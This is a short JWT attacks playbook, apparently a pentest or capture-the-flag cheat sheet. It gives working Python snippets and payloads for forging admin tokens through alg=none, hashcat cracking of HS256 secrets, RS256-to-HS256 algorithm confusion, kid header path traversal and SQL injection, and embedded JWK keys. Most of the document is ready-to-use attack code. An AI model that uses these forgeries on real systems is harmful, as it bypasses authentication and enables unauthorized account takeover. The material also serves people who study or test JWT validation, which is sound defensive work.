# JWT Attacks Playbook

## Decode first

```python
import jwt
print(jwt.decode(token, options={"verify_signature": False}))
```
Or:
```bash
echo $TOKEN | cut -d. -f1 | base64 -d
echo $TOKEN | cut -d. -f2 | base64 -d
```

## alg=none

If the server accepts `alg: none`:
```python
import jwt
forged = jwt.encode({"user": "admin"}, "", algorithm="none")
```
Some libs reject empty signature — try `{"alg": "none"}` with an empty third segment.

See `exploits/web/jwt_none_alg.py`.

## Weak HMAC secret

Brute-force the HS256 secret:
```bash
# jwt_tool or hashcat
hashcat -m 16500 token.txt wordlist.txt
```
Common weak secrets: `secret`, `password`, `jwt`, `admin`, app name, the host name.

## Algorithm confusion (RS256 → HS256)

If server uses RSA and public key is available, re-sign with HS256 using the public key bytes as the HMAC key:
```python
import jwt
with open('public.pem') as f:
    pub = f.read()
forged = jwt.encode({"user":"admin"}, pub, algorithm="HS256")
```

## kid injection

If `kid` header is used in a file path or SQL lookup:
```json
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
```
This forces the key to be empty → sign with empty key. Or SQL: `"kid":"x' UNION SELECT 'password"`.

## JWK embedded

If `jwk` header is accepted, you can embed your own public key:
```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"<your-n>","e":"AQAB"}}
```
Sign with your private key — server validates using the jwk you supplied.
